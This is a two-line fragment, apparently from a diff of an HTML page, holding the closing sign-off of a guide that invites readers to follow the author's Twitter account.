+I hope some of these techniques help you! If you liked my guide, be sure to follow me on Twitter: @johnjhacking <br>
+  </h3>
